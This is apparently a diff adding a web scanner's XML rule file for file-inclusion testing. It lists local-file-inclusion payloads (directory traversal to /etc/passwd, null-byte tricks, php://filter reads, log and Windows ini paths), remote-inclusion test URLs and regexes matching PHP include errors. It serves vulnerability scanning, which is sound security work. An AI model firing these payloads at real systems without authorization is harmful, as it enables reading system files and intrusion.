@@ -1,0 +1,67 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<root>
+	<LFI>
+		<rule vector="/etc/passwd" windows='0' linux='1'><![CDATA[root:x:0:0:root:/root:/bin/bash]]></rule>
+		<rule vector="/etc/passwd%00" windows='0' linux='1'><![CDATA[root:x:0:0:root:/root:/bin/bash]]></rule>
+		<rule vector="/etc/passwd\0" windows='0' linux='1'><![CDATA[root:x:0:0:root:/root:/bin/bash]]></rule>
+		<rule vector="php://filter/read=convert.base64-encode/resource=" windows='0' linux='1'><![CDATA[cm9vdDp4OjA6MDpyb290Oi9yb290Oi9ia]]></rule>
+		<rule vector="/etc/passwd\0.html" windows='0' linux='1'><![CDATA[root:x:0:0:root:/root:/bin/bash]]></rule>
+		<rule vector="file:///etc/passwd" windows='0' linux='1'><![CDATA[root:x:0:0:root:/root:/bin/bash]]></rule>
+		<rule vector="/proc/self/environ" windows='0' linux='1'><![CDATA[XDG_SESSION_ID=]]></rule>
+		<rule vector="/proc/self/environ%00" windows='0' linux='1'><![CDATA[XDG_SESSION_ID=]]></rule>
+		<rule vector="../../../../../../../../../../../../../../../etc/passwd" windows='0' linux='1'><![CDATA[root:x:0:0:root:/root:/bin/bash]]></rule>
+		<rule vector="../../../../../../../../../../../../../../../etc/passwd%00" windows='0' linux='1'><![CDATA[root:x:0:0:root:/root:/bin/bash]]></rule>
+		<rule vector="../../../../../../../../../../../../../../../etc/passwd\0" windows='0' linux='1'><![CDATA[root:x:0:0:root:/root:/bin/bash]]></rule>
+		<rule vector="../../../../../../../../../../../../../../../etc/passwd\0.html" windows='0' linux='1'><![CDATA[root:x:0:0:root:/root:/bin/bash]]></rule>
+		<rule vector="/var/log/apache2/access.log" windows='0' linux='1'><![CDATA["GET\s*?/\s*?HTTP/1\.1"\s+?\d{3}\s*?\d+]]></rule>
+		<rule vector="/var/log/apache2/access.log%00" windows='0' linux='1'><![CDATA["GET\s*?/\s*?HTTP/1\.1"\s+?\d{3}\s*?\d+]]></rule>
+		<rule vector="/var/log/apache/access.log" windows='0' linux='1'><![CDATA["GET\s*?/\s*?HTTP/1\.1"\s+?\d{3}\s*?\d+]]></rule>
+		<rule vector="/var/log/apache/access.log%00" windows='0' linux='1'><![CDATA["GET\s*?/\s*?HTTP/1\.1"\s+?\d{3}\s*?\d+]]></rule>
+		<rule vector="/var/log/httpd/access.log" windows='0' linux='1'><![CDATA["GET\s*?/\s*?HTTP/1\.1"\s+?\d{3}\s*?\d+]]></rule>
+		<rule vector="/var/log/httpd/access.log%00" windows='0' linux='1'><![CDATA["GET\s*?/\s*?HTTP/1\.1"\s+?\d{3}\s*?\d+]]></rule>
+		<rule vector="/var/log/apache2/access_log" windows='0' linux='1'><![CDATA["GET\s*?/\s*?HTTP/1\.1"\s+?\d{3}\s*?\d+]]></rule>
+		<rule vector="/var/log/apache2/access_log%00" windows='0' linux='1'><![CDATA["GET\s*?/\s*?HTTP/1\.1"\s+?\d{3}\s*?\d+]]></rule>
+		<rule vector="/var/log/apache/access_log" windows='0' linux='1'><![CDATA["GET\s*?/\s*?HTTP/1\.1"\s+?\d{3}\s*?\d+]]></rule>
+		<rule vector="/var/log/apache/access_log%00" windows='0' linux='1'><![CDATA["GET\s*?/\s*?HTTP/1\.1"\s+?\d{3}\s*?\d+]]></rule>
+		<rule vector="/var/log/httpd/access_log" windows='0' linux='1'><![CDATA["GET\s*?/\s*?HTTP/1\.1"\s+?\d{3}\s*?\d+]]></rule>
+		<rule vector="/var/log/httpd/access_log%00" windows='0' linux='1'><![CDATA["GET\s*?/\s*?HTTP/1\.1"\s+?\d{3}\s*?\d+]]></rule>
+		<rule vector="c:/boot.ini" windows='1' linux='0'><![CDATA[boot loader]]></rule>
+		<rule vector="c:/boot.ini%00" windows='1' linux='0'><![CDATA[boot loader]]></rule>
+		<rule vector="file:///c:/boot.ini" windows='0' linux='1'><![CDATA[boot loader]]></rule>
+		<rule vector="%SYSTEMROOT%\\win.ini" windows='1' linux='0'><![CDATA[boot loader]]></rule>
+		<rule vector="%SYSTEMROOT%\\win.ini\0" windows='1' linux='0'><![CDATA[boot loader]]></rule>
+		<rule vector="%SYSTEMROOT%\\win.ini\0.html" windows='1' linux='0'><![CDATA[boot loader]]></rule>
+		<rule vector="c:/windows/win.ini" windows='1' linux='0'><![CDATA[;\s* for\s*16-bit\s*app\s*support]]></rule>
+		<rule vector="c:/windows/win.ini%00" windows='1' linux='0'><![CDATA[;\s* for\s*16-bit\s*app\s*support]]></rule>
+		<rule vector="[!{SELF}!]" windows='1' linux='1'><![CDATA[<\?php]]></rule>
+		<rule vector="[!{SELF}!]" windows='1' linux='0'><![CDATA[<%@LANGUAGE="VBSCRIPT"]]></rule>
+		<!--rule vector="[!php://input@{RANDOM_STR}!]" windows='1' linux='1'><![CDATA[[!{RANDOM_STR}!]]]></rule-->
+	</LFI>
+	<RFI>
+		<rule vector="http://www.apache.org/dyn/closer.cgi" windows='1' linux='1'><![CDATA[We suggest the following mirror site for your download]]></rule>
+		<rule vector="http://www.tencent.com/en-us/index.shtml" windows='1' linux='1'><![CDATA[Founded in November, 1998, Tencent, Inc]]></rule>
+		<rule vector="http://testasp.vulnweb.com/t/fit.txt" windows='1' linux='1'><![CDATA[63c19a6da79816b21429e5bb262daed863c19a6da79816b21429e5bb262daed8]]></rule>
+	</RFI>
+	<FI>
+		<rule vector="" windows='1' linux='1'><![CDATA[warning.*?fopen]]></rule>
+		<rule vector="" windows='1' linux='1'><![CDATA[warning.*?fpassthru]]></rule>
+		<rule vector="" windows='1' linux='1'><![CDATA[\(include_path='.*?'\) in &lt;b&gt;(\?P&lt;script&gt;.*?)&lt;/b&gt;* on line]]></rule>
+		<rule vector="" windows='1' linux='1'><![CDATA[failed to open stream: No such file or directory \((\?P&lt;script&gt;.*?)- Line]]></rule>
+		<rule vector="" windows='1' linux='1'><![CDATA[An error occurred in script '(\?P&lt;script&gt;.*?)' on line \d?.]]></rule>
+		<rule vector="" windows='1' linux='1'><![CDATA[Failed opening '.*?' for inclusion in &lt;b&gt; (\?P&lt;script&gt;.*?)&lt;/b&gt; on line]]></rule>
+		<rule vector="" windows='1' linux='1'><![CDATA[Failed opening '.*?' for inclusion .*? in (&lt;b&gt; )?(\?P&lt;script&gt;.*?) (&lt;b&gt; )?on line]]></rule>
+		<rule vector="" windows='1' linux='1'><![CDATA[Failed opening required '.*?' .*? in (\?P&lt;script&gt;.*?) on]]></rule>
+		<rule vector="" windows='1' linux='1'><![CDATA[failed to open stream:.*?@(\?P&lt;script&gt;.*?):]]></rule>
+		<rule vector="" windows='1' linux='1'><![CDATA[in file &lt;b&gt;(\?P&lt;script&gt;.*?)&lt;/b&gt;]]></rule>
+		<rule vector="" windows='1' linux='1'><![CDATA[failed to open stream: No such file or directory in (\?P&lt;script&gt;.*?) on line]]></rule>
+		<rule vector="" windows='1' linux='1'><![CDATA[failed to open stream: No such file or directory in &lt;b&gt;(\?P&lt;script&gt;.*?)&lt;/b&gt; on line]]></rule>
+		<rule vector="" windows='1' linux='1'><![CDATA[Failed opening .*? for inclusion .*?on (\?P&lt;script&gt;.*?)]]></rule>
+
+		<rule vector="" windows='1' linux='1'><![CDATA[Failed opening( required)* '(\?P&lt;incname&gt;[\d\w/\.\-:\\]*?%s[\d\w/\.\-\\]*?)' (for inclusion)*]]></rule>
+
+		<rule vector="" windows='1' linux='1'><![CDATA[&lt;b&gt;Warning&lt;/b&gt;:  file(.*?%s.*?)*]]></rule>
+		<rule vector="" windows='1' linux='1'><![CDATA[&lt;b&gt;Warning&lt;/b&gt;:  read_file(.*?%s.*?)*]]></rule>
+		<rule vector="" windows='1' linux='1'><![CDATA[&lt;b&gt;Warning&lt;/b&gt;:  highlight_file(.*?%s.*?)*]]></rule>
+		<rule vector="" windows='1' linux='1'><![CDATA[&lt;b&gt;Warning&lt;/b&gt;:  show_source(.*?%s.*?)*]]></rule>
+	</FI>
+</root>
